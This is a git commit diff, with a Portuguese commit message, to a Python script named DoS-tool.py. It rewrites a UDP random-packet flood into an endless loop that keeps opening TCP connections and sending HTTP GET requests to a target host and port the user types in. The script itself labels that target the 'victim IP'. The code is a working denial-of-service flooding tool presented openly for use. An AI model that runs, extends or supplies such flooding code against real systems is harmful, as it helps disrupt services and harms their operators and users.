e791b9aa488d4a1a2a1e9bd6b41d4624a85e43fc
Bartzin55 <luizotaviobart55@gmail.com>
2025-11-17 01:12:06 -0300

    firewall não perfeito mas funcionando o suficiente para o trabalho, atualizado script do DoS-tool.py

--- DoS-Tool/DoS-tool.py
+++ DoS-Tool/DoS-tool.py
@@ -9,7 +9,7 @@ print("Github: https://github.com/Bartzin55")
 print("Github: https://github.com/bella4424")
 
 #entrada do IP
-ip = input("\nIP de destino(Apenas IPv4) ou Hosname: ")
+ip_or_hostname = input("\nIP de destino(Apenas IPv4) ou Hosname: ")
 
 #entrada da porta
 strport = input("Porta de destino: ")
@@ -25,24 +25,36 @@ if port < 0 or port > 65535:
     sys.exit()
 
 #gera um pacote de bytes aleatórios, do tamanho especificado pelo user
-packet = os.urandom(1472)
-destination = (ip,port)
-print("\n---------------")
-print(f"REVISÃO\n\nIP de destino: {ip}\nPorta: {port}\n")
-
+packet = (
+    "GET / HTTP/1.1\r\n"
+    f"Host: {ip_or_hostname}\r\n"
+    "User-Agent: FloodTest/1.0\r\n"
+    "Accept: */*\r\n"
+    "Connection: keep-alive\r\n"
+    "\r\n"
+).encode()
+destination = (ip_or_hostname, port)
 confirmation = input("Iniciar envio de pacotes (y): ")
 
 if confirmation == "y" or confirmation == "Y":
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"IP vítima: {ip}, porta: {port}")
+    print(f"IP vítima: {ip_or_hostname}, porta: {port}")
     print("Iniciando, pare a qualquer momento com CONTROL+C...")
     time.sleep(5)
 
     packetcount = 1
     while True:
-        print(f"Enviando {packetcount} pacotes de 1472 bytes para {ip}:{port}")
-        packetcount = packetcount+1
-        sock.sendto(packet, destination)
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            sock.connect(destination)
+            sock.send(packet)
+            sock.close()
+            packetcount += 1
+            print(f"Sent {packetcount} data packet to {ip_or_hostname}:{port}")
+        except:
+            print("Destination not found.")
+            sys.exit()
 
 else:
     print("\nOPERAÇÃO CANCELADA")
